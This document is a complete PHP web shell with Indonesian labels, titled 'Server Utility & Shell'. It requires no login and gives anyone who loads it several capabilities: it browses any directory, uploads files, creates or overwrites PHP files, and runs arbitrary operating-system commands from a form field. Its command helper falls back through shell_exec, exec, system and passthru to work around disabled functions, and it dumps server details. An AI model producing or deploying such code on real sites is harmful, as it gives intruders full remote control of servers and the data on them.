<?php
// Navigasi Direktori File
$dir = isset($_GET['dir']) ? $_GET['dir'] : './';
$dir = realpath($dir);
if (!$dir || !is_dir($dir)) { $dir = realpath('./'); }

$pesanAksi = "";

// 1. PROSES UPLOAD FILE
if (isset($_POST['submit_upload']) && isset($_FILES['berkas'])) {
    $targetPath = $dir . DIRECTORY_SEPARATOR . basename($_FILES['berkas']['name']);
    if (move_uploaded_file($_FILES['berkas']['tmp_name'], $targetPath)) {
        $pesanAksi = "<span style='color:#0f0;'>File berhasil diunggah ke: " . htmlspecialchars($targetPath) . "</span>";
    } else {
        $pesanAksi = "<span style='color:red;'>Gagal mengunggah file. Periksa izin folder.</span>";
    }
}

// 2. PROSES BUAT FILE BARU
if (isset($_POST['submit_buat_file'])) {
    $namaBaru = trim($_POST['nama_file_baru']);
    $isiBaru = $_POST['isi_file_baru'] ?? '';
    if (!empty($namaBaru)) {
        $pathBaru = $dir . DIRECTORY_SEPARATOR . basename($namaBaru);
        if (file_put_contents($pathBaru, $isiBaru) !== false) {
            $pesanAksi = "<span style='color:#0f0;'>File '$namaBaru' berhasil dibuat!</span>";
        } else {
            $pesanAksi = "<span style='color:red;'>Gagal membuat file baru.</span>";
        }
    }
}

// 3. PROSES SIMPAN EDIT FILE
if (isset($_POST['submit_simpan_edit'])) {
    $targetFileEdit = $_POST['path_file_edit'] ?? '';
    $isiEditBaru = $_POST['isi_file_edit'] ?? '';
    
    // Keamanan sederhana agar tidak keluar dari root direktori server jika diinginkan, atau sesuaikan
    if (!empty($targetFileEdit) && file_exists($targetFileEdit) && is_file($targetFileEdit)) {
        if (file_put_contents($targetFileEdit, $isiEditBaru) !== false) {
            $pesanAksi = "<span style='color:#0f0;'>File berhasil disimpan!</span>";
        } else {
            $pesanAksi = "<span style='color:red;'>Gagal menyimpan perubahan file.</span>";
        }
    }
}

// 4. HELPER EKSEKUSI SHELL MULTI-FALLBACK
function run_cmd($cmd) {
    if (function_exists('shell_exec')) return shell_exec($cmd . " 2>&1");
    if (function_exists('exec')) { exec($cmd . " 2>&1", $out); return implode("\n", $out); }
    if (function_exists('system')) { ob_start(); system($cmd . " 2>&1"); return ob_get_clean(); }
    if (function_exists('passthru')) { ob_start(); passthru($cmd . " 2>&1"); return ob_get_clean(); }
    return "Error: Tidak ada fungsi eksekusi shell yang aktif di server ini.";
}

$outputShell = "";
$commandDijalankan = $_POST['command'] ?? '';
if (isset($_POST['submit_shell']) && !empty($commandDijalankan)) {
    $outputShell = htmlspecialchars(run_cmd("cd " . escapeshellarg($dir) . " && " . $commandDijalankan));
}

// Cek apakah sedang mode edit file
$modeEdit = false;
$fileTargetEdit = '';
$kontenFileEdit = '';
if (isset($_GET['edit'])) {
    $fileTargetEdit = realpath($_GET['edit']);
    if ($fileTargetEdit && is_file($fileTargetEdit)) {
        $modeEdit = true;
        $kontenFileEdit = file_get_contents($fileTargetEdit);
    }
}

// Cek apakah sedang mode buat file baru
$modeBuatBaru = isset($_GET['newfile']);
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Server Utility & Shell</title>
    <style>
        body { font-family: monospace; background: #121212; color: #e0e0e0; padding: 20px; line-height: 1.5; }
        a { color: #4da6ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; background: #1e1e1e; }
        th, td { border: 1px solid #333; padding: 8px 12px; text-align: left; }
        th { background: #252525; }
        input[type=text], input[type=file], textarea { background: #1e1e1e; color: #fff; border: 1px solid #444; padding: 8px; width: 100%; box-sizing: border-box; }
        button, .btn { background: #0066cc; color: #fff; border: none; padding: 6px 12px; cursor: pointer; border-radius: 3px; font-family: monospace; }
        button:hover, .btn:hover { background: #0052a3; }
        .btn-red { background: #cc0000; }
        .btn-red:hover { background: #a30000; }
        .btn-green { background: #009933; }
        .btn-green:hover { background: #007a29; }
        pre { background: #000; color: #00ff00; padding: 15px; border-radius: 4px; overflow-x: auto; }
        .card { background: #1e1e1e; border: 1px solid #333; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .actions-group { display: flex; gap: 5px; }
    </style>
</head>
<body>

    <div style="display:flex; justify-content:space-between; align-items:center;">
        <h2>Web Terminal & Server Info</h2>
    </div>

    <?php if (!empty($pesanAksi)) echo "<div class='card'>p: $pesanAksi</div>"; ?>

    <!-- MODAL / FORM EDIT FILE -->
    <?php if ($modeEdit): ?>
    <div class="card" style="border-color: #0066cc;">
        <h3>Edit File: <?php echo htmlspecialchars(basename($fileTargetEdit)); ?></h3>
        <p><small><?php echo htmlspecialchars($fileTargetEdit); ?></small></p>
        <form method="post">
            <input type="hidden" name="path_file_edit" value="<?php echo htmlspecialchars($fileTargetEdit); ?>">
            <textarea name="isi_file_edit" rows="15" style="width:15; font-family:monospace;"><?php echo htmlspecialchars($kontenFileEdit); ?></textarea><br><br>
            <button type="submit" name="submit_simpan_edit" class="btn-green">💾 Simpan Perubahan</button>
            <a href="?dir=<?php echo urlencode(dirname($fileTargetEdit)); ?>" class="btn" style="background:#555;">Kembali</a>
        </form>
    </div>
    <?php endif; ?>

    <!-- FORM BUAT FILE BARU -->
    <?php if ($modeBuatBaru): ?>
    <div class="card" style="border-color: #009933;">
        <h3>Buat File Baru di: <?php echo htmlspecialchars($dir); ?></h3>
        <form method="post">
            <label>Nama File (contoh: <code>test.php</code> atau <code>index.php</code>):</label><br>
            <input type="text" name="nama_file_baru" placeholder="nama_file.php" required style="margin-bottom: 10px;"><br>
            <label>Isi File:</label><br>
            <textarea name="isi_file_baru" rows="10" placeholder="Tulis kode HTML/PHP di sini..." style="font-family:monospace; margin-bottom: 10px;"></textarea><br>
            <button type="submit" name="submit_buat_file" class="btn-green">✔ Buat File</button>
            <a href="?dir=<?php echo urlencode($dir); ?>" class="btn" style="background:#555;">Batal</a>
        </form>
    </div>
    <?php endif; ?>

    <!-- TERMINAL SHELL -->
    <div class="card">
        <h3>Shell Command Terminal</h3>
        <form method="post">
            <input type="text" name="command" style="width: 70%; display:inline-block;" placeholder="Masukkan perintah (e.g. ls -la, pwd, whoami)" value="<?php echo htmlspecialchars($commandDijalankan); ?>" required>
            <button type="submit" name="submit_shell">Jalankan</button>
        </form>
        <div style="margin-top: 10px;">
            <small>Quick Commands: </small>
            <button type="button" onclick="setCmd('ls -la')">ls -la</button>
            <button type="button" onclick="setCmd('pwd')">pwd</button>
            <button type="button" onclick="setCmd('whoami')">whoami</button>
            <button type="button" onclick="setCmd('df -h')">df -h</button>
            <button type="button" onclick="setCmd('uname -a')">uname -a</button>
        </div>

        <?php if (!empty($outputShell)): ?>
            <h4>Output:</h4>
            <pre><?php echo $outputShell; ?></pre>
        <?php endif; ?>
    </div>

    <!-- FILE MANAGER & UPLOAD -->
    <div class="card">
        <h3>File Manager</h3>
        <p><b>Path Saat Ini:</b> <?php echo htmlspecialchars($dir); ?></p>
        
        <div style="margin-bottom: 15px; display:flex; gap: 10px; align-items: center; flex-wrap: wrap;">
            <form method="post" enctype="multipart/form-data" style="display:flex; gap:5px; align-items:center;">
                <label>Upload:</label>
                <input type="file" name="berkas" required style="width: auto;">
                <button type="submit" name="submit_upload">Upload</button>
            </form>
            <a href="?dir=<?php echo urlencode($dir); ?>&newfile=1" class="btn btn-green">➕ Buat File Baru</a>
        </div>

        <table>
            <tr>
                <th>Nama File / Folder</th>
                <th>Tipe</th>
                <th>Ukuran</th>
                <th>Izin (Chmod)</th>
                <th>Aksi</th>
            </tr>
            <tr>
                <td><a href="?dir=<?php echo urlencode(dirname($dir)); ?>">📁 .. (Kembali)</a></td>
                <td>Folder</td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
            </tr>
            <?php
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $filePath = $dir . DIRECTORY_SEPARATOR . $file;
                $isDir = is_dir($filePath);
                $perms = substr(sprintf('%o', fileperms($filePath)), -4);
                $size = $isDir ? '-' : number_format(filesize($filePath)) . ' B';
                
                echo "<tr>";
                if ($isDir) {
                    echo "<td><a href='?dir=" . urlencode($filePath) . "'>📁 $file</a></td><td>Folder</td><td>$size</td><td>$perms</td><td>-</td>";
                } else {
                    echo "<td>📄 $file</td><td>File</td><td>$size</td><td>$perms</td>";
                    echo "<td><div class='actions-group'>";
                    echo "<a href='?dir=" . urlencode($dir) . "&edit=" . urlencode($filePath) . "' class='btn'>✏ Edit</a>";
                    echo "</div></td>";
                }
                echo "</tr>";
            }
            ?>
        </table>
    </div>

    <!-- INFORMASI SERVER -->
    <div class="card">
        <h3>Informasi Server</h3>
        <table>
            <tr><td><b>Host Name</b></td><td><?php echo $_SERVER['SERVER_NAME']; ?></td></tr>
            <tr><td><b>Server IP</b></td><td><?php echo $_SERVER['SERVER_ADDR'] ?? 'Tidak terdeteksi'; ?></td></tr>
            <tr><td><b>Web Server</b></td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td></tr>
            <tr><td><b>Versi PHP</b></td><td><?php echo phpversion(); ?></td></tr>
            <tr><td><b>User Web Server</b></td><td><?php echo run_cmd('whoami'); ?></td></tr>
            <tr><td><b>Document Root</b></td><td><?php echo $_SERVER['DOCUMENT_ROOT']; ?></td></tr>
            <tr><td><b>Upload Limits</b></td><td>upload_max: <?php echo ini_get('upload_max_filesize'); ?> | post_max: <?php echo ini_get('post_max_size'); ?></td></tr>
            <tr><td><b>OS Server</b></td><td><?php echo php_uname(); ?></td></tr>
        </table>
    </div>

    <script>
        function setCmd(cmd) {
            document.querySelector('input[name="command"]').value = cmd;
        }
    </script>
</body>
</html>
